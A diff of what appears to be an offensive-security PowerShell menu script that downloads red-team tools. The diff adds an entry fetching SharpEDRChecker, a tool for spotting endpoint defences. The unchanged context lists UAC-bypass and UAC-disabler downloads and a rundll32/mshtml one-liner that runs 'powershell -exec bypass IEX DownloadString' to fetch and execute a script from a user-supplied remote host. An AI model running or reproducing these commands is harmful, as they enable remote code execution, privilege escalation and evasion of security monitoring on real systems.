@@ -97,7 +97,7 @@ while($true){
     write-host " 232. hyp3rlinx/DarkFinger-C2-Agent";
     write-host "ANALISYS";
     write-host " 30. sysinternals/NotMyFault`t`t`t`t`t31. sysinternals/Procdump`t`t`t`t`t32. sysinternals/PSTools";
-    write-host " 174. sysinternals/TCPView";
+    write-host " 174. sysinternals/TCPView`t`t`t`t`t369. PwnDexter/SharpEDRChecker";
     write-host "ANONYMIZATION";
     write-host " 234. torbrowser/9.5/tor-win64-0.4.3.5`t`t`t`t235. torbrowser/9.5/tor-win32-0.4.3.5";
     write-host "AZURE";
@@ -617,6 +617,7 @@ while($true){
         '366' {Scarica "gushmazuko/WinBypass/DiskCleanupBypass_direct" "DiskCleanupBypass_direct.ps1" "gushmazuko/WinBypass/master/DiskCleanupBypass_direct.ps1"}
         '367' {ScaricaBat "Mncx86/Windows-10-UAC-bypass" "uacdisabler.bat" "Mncx86/Windows-10-UAC-bypass/master/uacdisabler.bat"}
         '368' {write-host "Digit a remote file to download"; $MIP=read-host "(example, http://10.11.12.13/script.ps1)"; if($MIP -le ""){rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('$MIP');"}}
+        '369' {ScaricaSSL "PwnDexter/SharpEDRChecker/1.1" "SharpEDRChecker.exe" "PwnDexter/SharpEDRChecker/releases/download/1.1/SharpEDRChecker.exe"}
         default{write-host 'ERROR: this choice is incorrect'}
     }
     read-host "Press ENTER to continue";
